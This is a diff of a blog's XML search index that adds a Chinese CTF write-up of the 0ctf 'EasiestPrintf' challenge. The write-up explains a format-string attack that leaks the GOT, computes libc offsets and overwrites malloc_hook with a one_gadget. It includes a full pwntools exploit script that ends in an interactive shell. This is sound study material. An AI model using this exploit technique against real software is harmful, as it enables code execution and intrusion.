@@ -3,7 +3,39 @@
   
     
     <entry>
-      <title><![CDATA[格式化字符串漏洞利用实战]]></title>
+      <title><![CDATA[格式化字符串漏洞利用实战之 0ctf-easyprintf]]></title>
+      <url>/2017/12/17/pwn_with_format_0ctf_easyprintf.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是 <code>0ctf</code> 的一道比较简单的格式化串的题目。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>逻辑非常简单</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506132721kaldyhzb.png?imageslim" alt="paste image"></p>
+<p><code>do_read</code> 可以打印内存地址的数据，可用来 泄露 <code>got</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506205821m9i5ym56.png?imageslim" alt="paste image"></p>
+<p><code>leave</code> 格式化字符串漏洞。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506227980602voj1w.png?imageslim" alt="paste image"></p>
+<p><code>printf(s)</code> 直接调用 <code>exit</code> 退出了。不过可以使用 <code>%1000c</code> 触发 <code>printf</code> 里面的 <code>malloc</code> 和 <code>free</code>, 所以思路很清楚了，修改 <code>free_hook</code> 或者 <code>malloc_hook</code> 为 <code>one_gadget</code>, 并且在格式化串末尾加上 <code>%1000c</code>触发 <code>malloc</code> 和 <code>free</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506399803fdtgne0f.png?imageslim" alt="paste image"></p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最开始修改 <code>free_hook</code>, 发现所有的 <code>one_gadget</code> 都不能用，后面使用了 <code>malloc_hook</code> ，终于找到一个可以用的，估计和寄存器的数据有关。</p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context(os=&apos;linux&apos;,log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line"></div><div class="line">p = process(&quot;./EasiestPrintf&quot;)</div><div class="line"></div><div class="line"># gdb.attach(p, &apos;&apos;&apos;</div><div class="line"></div><div class="line"># c</div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">setvbuf_got = 0x08049FF0 </div><div class="line">exit_got = 0x08049FE4</div><div class="line"></div><div class="line">pause()</div><div class="line">p.sendline(str(setvbuf_got))</div><div class="line">p.recvuntil(&quot;Which address you wanna read:\n&quot;)</div><div class="line">setvbuf_addr = int(p.recv(len(&apos;0xf7e60360&apos;)), 16)</div><div class="line">libc_addr = setvbuf_addr - 0x60360</div><div class="line">free_hook = libc_addr + 0x1b38b0</div><div class="line">malloc_hook = libc_addr + 0x1b2768</div><div class="line">one_gadget = libc_addr + 0x3ac69</div><div class="line">log.info(&quot;free_hook: &quot; + hex(free_hook))</div><div class="line">log.info(&quot;one_gadget: &quot; + hex(one_gadget))</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = fmtstr_payload(7, &#123;malloc_hook: one_gadget&#125;)  </div><div class="line">payload +=  &quot;%100000c&quot;</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> format string </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[格式化字符串漏洞利用实战之 njctf-decoder]]></title>
       <url>/2017/12/17/pwn_with_format_decoder.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>格式化字符串漏洞也是一种比较常见的漏洞利用技术。<code>ctf</code> 中也经常出现。</p>
 <p>本文以 <code>njctf</code> 线下赛的一道题为例进行实战。</p>
